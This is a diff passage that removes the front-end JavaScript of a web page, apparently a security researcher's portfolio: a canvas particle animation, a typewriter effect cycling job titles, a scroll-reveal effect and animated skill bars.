-  function resize(){W=c.width=c.offsetWidth;H=c.height=c.offsetHeight;}
-
-
-  window.addEventListener('resize',resize);resize();
-
-
-  class P{
-
-
-    constructor(){this.reset();}
-
-
-    reset(){this.x=Math.random()*W;this.y=Math.random()*H;this.vx=(Math.random()-.5)*.35;this.vy=(Math.random()-.5)*.35;this.r=Math.random()*1.4+.3;this.a=Math.random()*.45+.08;}
-
-
-    step(){this.x+=this.vx;this.y+=this.vy;if(this.x<0)this.x=W;if(this.x>W)this.x=0;if(this.y<0)this.y=H;if(this.y>H)this.y=0;}
-
-
-    draw(){ctx.beginPath();ctx.arc(this.x,this.y,this.r,0,Math.PI*2);ctx.fillStyle=`rgba(232,0,29,${this.a})`;ctx.fill();}
-
-
-  }
-
-
-  for(let i=0;i<130;i++)pts.push(new P());
-
-
-  function loop(){
-
-
-    ctx.clearRect(0,0,W,H);
-
-
-    for(let i=0;i<pts.length;i++){
-
-
-      for(let j=i+1;j<pts.length;j++){
-
-
-        const dx=pts[i].x-pts[j].x,dy=pts[i].y-pts[j].y,d=Math.hypot(dx,dy);
-
-
-        if(d<110){ctx.beginPath();ctx.moveTo(pts[i].x,pts[i].y);ctx.lineTo(pts[j].x,pts[j].y);ctx.strokeStyle=`rgba(232,0,29,${(1-d/110)*.1})`;ctx.lineWidth=.5;ctx.stroke();}
-
-
-      }
-
-
-      pts[i].step();pts[i].draw();
-
-
-    }
-
-
-    requestAnimationFrame(loop);
-
-
-  }
-
-
-  loop();
-
-
-})();
-
-
-
-
-
-/* Typewriter */
-
-
-(function(){
-
-
-  const phrases=['Bug Bounty Hunter','Web App Penetration Tester','Exploit Researcher','Open-Source Contributor'];
-
-
-  const el=document.getElementById('typed-text');
-
-
-  let pi=0,ci=0,del=false,hold=0;
-
-
-  function tick(){
-
-
-    const p=phrases[pi];
-
-
-    if(!del){el.textContent=p.slice(0,++ci);if(ci===p.length){del=true;hold=70;}}
-
-
-    else{if(hold-->0){setTimeout(tick,28);return;}el.textContent=p.slice(0,--ci);if(ci===0){del=false;pi=(pi+1)%phrases.length;}}
-
-
-    setTimeout(tick,del?38:80);
-
-
-  }
-
-
-  tick();
-
-
-})();
-
-
-
-
-
-/* Scroll reveal */
-
-
-const obs=new IntersectionObserver(es=>es.forEach(e=>{if(e.isIntersecting){e.target.classList.add('in');obs.unobserve(e.target);}}),{threshold:.12});
-
-
-document.querySelectorAll('.reveal').forEach(el=>obs.observe(el));
-
-
-
-
-
-/* Skill bars */
-
-
-const bobs=new IntersectionObserver(es=>es.forEach(e=>{
-
-
-  if(e.isIntersecting){e.target.querySelectorAll('.sbf').forEach(b=>b.style.width=b.dataset.w+'%');bobs.unobserve(e.target);}
-
-
-}),{threshold:.3});
-
-
-document.querySelectorAll('.sg').forEach(g=>bobs.observe(g));
-
+});
 
 </script>
 
 </body>
-
 </html>
